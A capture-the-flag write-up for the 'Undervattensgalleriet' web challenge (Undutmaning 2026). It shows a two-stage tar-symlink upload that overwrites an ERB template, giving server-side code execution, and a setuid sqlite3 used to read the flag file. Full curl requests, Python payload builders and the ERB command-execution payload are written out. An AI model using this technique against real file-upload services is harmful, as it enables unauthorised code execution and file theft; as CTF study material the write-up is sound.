---
title: "Undutmaning 2026: Undervattensgalleriet"
description: "Writeup for Undervattensgalleriet from Undutmaning 2026. Challenge weight: 100 points."
slug: undutmaning-undervattensgalleriet
date: 2026-03-21 19:57:03.586+0000
competition: "Undutmaning 2026"
categories:
    - Web Exploitation
tags:
    - writeup
    - undutmaning-2026
    - undervattensgalleriet
---

## Challenge

- Competition: [Undutmaning 2026](https://undutmaning.se/)
- Challenge: `Undervattensgalleriet`
- Category: `Web Exploitation`
- Points: `100`
- Original target(s): [https://undervattensgalleriet.challs.undutmaning.se](https://undervattensgalleriet.challs.undutmaning.se)


## Solve Path

FLAG:
undut{men_vi_hittar_alltid_svaren_28343229}

WRITEUP:
1) Target Overview
   - URL / endpoint: Observed instance was `https://d1c28a60-undervattensgalleriet.challs.undutmaning.se`
   - Tech stack (if known): Sinatra 3.2, Rack 2.2, SQLite, ERB, BusyBox/Alpine tar
   - Observed behavior: Authenticated users can create galleries from uploaded `.tar` files and later update the same gallery with `PUT /galleries/:path`

2) Recon
   - Directory discovery: `/robots.txt`, `/admin`, `/api` all returned 404
   - Parameters found: `user`, `password`, `title`, `file`, gallery path in `/galleries/:path`
   - Cookies / sessions: `rack.session`
   - Headers: Standard Sinatra headers, no special API behavior
   - JS analysis: No relevant client-side logic
   - Hidden endpoints: None beyond source-defined routes
   - Source review:
     - `mkgallery` runs `tar x -C #{d} -f #{params[:file][:tempfile].path}`
     - `PUT /galleries/:path` re-extracts attacker tar into the same gallery directory
     - `GET /galleries/:path` renders `erb :gallery`
     - Dockerfile sets `/usr/bin/sqlite3` setuid-root
   - Test matrix highlights:
     - SQL injection: no evidence
     - XSS: not needed
     - LFI: confirmed via symlinked static-file reads
     - Auth bypass: not needed
     - File upload abuse: confirmed
     - SSTI: no direct input SSTI, but template overwrite gives equivalent server-side code execution

3) Vulnerability
   - Type: File upload abuse via tar symlinks, followed by arbitrary file write outside the gallery, ending in ERB template execution
   - Root cause: The first upload can plant symlinks inside the gallery. A later `PUT` upload extracts files through those pre-existing symlinks, so writes escape the gallery and land in `/srv/views/gallery.erb`
   - Proof of vulnerability:
     - Uploaded symlink `readapp -> /srv/app.rb`
     - Exact request:
```bash
curl -i -s https://d1c28a60-undervattensgalleriet.challs.undutmaning.se/xlmnx2mr/readapp
```
     - Response contained the application source from `/srv/app.rb`
     - Uploaded symlink `pub -> /srv/public`, then updated gallery with file `pub/pt3.txt`
     - Exact request:
```bash
curl -i -s https://d1c28a60-undervattensgalleriet.challs.undutmaning.se/xlmnx2mr/pub/pt3.txt
```
     - Response proof: `PT3-FOLLOW`

4) Exploitation
   - Step-by-step HTTP requests

```bash
HOST='https://d1c28a60-undervattensgalleriet.challs.undutmaning.se'
JAR='app.jar'
USER='ctfuser'
PASS='ctfpass'

curl -s -c "$JAR" "$HOST/" > /dev/null
curl -i -s -c "$JAR" -b "$JAR" -d "user=$USER&password=$PASS" "$HOST/register"
```

```bash
python3 - <<'PY'
import tarfile
with tarfile.open('stage1.tar','w') as tar:
    for name,target in [('v','/srv/views')]:
        ti=tarfile.TarInfo(name)
        ti.type=tarfile.SYMTYPE
        ti.linkname=target
        tar.addfile(ti)
PY
```

```bash
curl -i -s -c "$JAR" -b "$JAR" \
  -F "title=probe" \
  -F "file=@stage1.tar;type=application/x-tar" \
  "$HOST/galleries"
```

   - The redirect gave gallery path `xlmnx2mr`

```bash
python3 - <<'PY'
import tarfile, io
payload = b'''<pre><%= %x(/usr/bin/sqlite3 :memory: "select hex(readfile('/srv/flag.txt'));" 2>&1) %></pre>\n'''
with tarfile.open('stage2.tar','w') as tar:
    ti=tarfile.TarInfo('v/gallery.erb')
    ti.size=len(payload)
    tar.addfile(ti, io.BytesIO(payload))
PY
```

```bash
curl -i -s -c "$JAR" -b "$JAR" -X PUT \
  -F "file=@stage2.tar;type=application/x-tar" \
  "$HOST/galleries/xlmnx2mr"
```

   - Payloads used:
     - Stage 1: symlink `v -> /srv/views`
     - Stage 2: ERB overwrite of `gallery.erb`
   - Why it works:
     - Update extraction follows the pre-existing symlink into `/srv/views`
     - `erb :gallery` evaluates attacker-controlled ERB
     - `/usr/bin/sqlite3` is setuid-root, so `readfile('/srv/flag.txt')` succeeds

5) Flag Extraction
   - Exact request that returns the flag:
```bash
curl -i -s "$HOST/galleries/xlmnx2mr"
```
   - Response proof:
```html
<pre>756E6475747B6D656E5F76695F6869747461725F616C6C7469645F73766172656E5F32383334333232397D0A</pre>
```
   - Decode:
```bash
python3 - <<'PY'
print(bytes.fromhex('756E6475747B6D656E5F76695F6869747461725F616C6C7469645F73766172656E5F32383334333232397D0A').decode())
PY
```
   - Decoded flag: `undut{men_vi_hittar_alltid_svaren_28343229}`
